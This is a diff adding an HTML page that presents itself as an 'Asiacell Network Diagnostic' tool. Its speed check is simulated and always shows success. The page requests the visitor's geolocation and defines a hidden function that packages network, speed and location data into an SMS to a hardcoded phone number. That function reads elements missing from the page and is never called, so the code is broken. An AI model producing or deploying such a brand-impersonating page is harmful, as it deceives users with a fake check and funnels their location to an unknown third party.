@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Asiacell Network Diagnostic</title>
+<style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f5f5f5;
+    }
+    h1 {
+      color: #b80000;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #b80000;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+    .check-item {
+      margin: 20px auto;
+      width: 300px;
+      padding: 10px;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .status {
+      font-weight: bold;
+      font-size: 18px;
+    }
+    .status.loading::after {
+      content: '⏳';
+    }
+    .status.success::after {
+      content: '✅';
+    }
+    .status.error::after {
+      content: '❌';
+    }
+  </style>
+</head>
+<body>
+<h1>Network Quality Check</h1>
+<p>Click the button below to start diagnosing your network connection.</p>
+<button onclick="startCheck()">Start Diagnostic</button>
+<div id="results" style="margin-top:40px; display:none;">
+<div class="check-item"><span>Checking Network Type</span><span class="status" id="net-status"></span></div>
+<div class="check-item"><span>Checking Download Speed</span><span class="status" id="speed-status"></span></div>
+<div class="check-item"><span>Checking Location</span><span class="status" id="loc-status"></span></div>
+</div>
+<script>
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function startCheck() {
+      document.getElementById("results").style.display = "block";
+
+      // Start Network Type Check
+      let netStatus = document.getElementById("net-status");
+      netStatus.className = "status loading";
+      await delay(1000);
+      let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn && conn.effectiveType) {
+        netStatus.className = "status success";
+      } else {
+        netStatus.className = "status error";
+      }
+
+      // Start Speed Check (Simulated for demo)
+      let speedStatus = document.getElementById("speed-status");
+      speedStatus.className = "status loading";
+      await delay(2000);
+      speedStatus.className = "status success";
+
+      // Start Location Check
+      let locStatus = document.getElementById("loc-status");
+      locStatus.className = "status loading";
+      navigator.geolocation.getCurrentPosition(
+        (pos) => { locStatus.className = "status success"; },
+        (err) => { locStatus.className = "status error"; }
+      );
+    }
+  
+
+function sendResultsViaSMS() {
+    const network = document.getElementById("network-type").innerText;
+    const download = document.getElementById("download-speed").innerText;
+    const location = document.getElementById("location").innerText;
+    const results = `Network: ${network}\nDownload: ${download}\nLocation: ${location}`;
+
+    const smsNumber = "+9647701180059";
+    const smsBody = encodeURIComponent("Asiacell Diagnostic Results:\n" + results);
+    const smsLink = `sms:${smsNumber}?body=${smsBody}`;
+
+    window.location.href = smsLink;
+}
+</script>
+</body>
+</html>
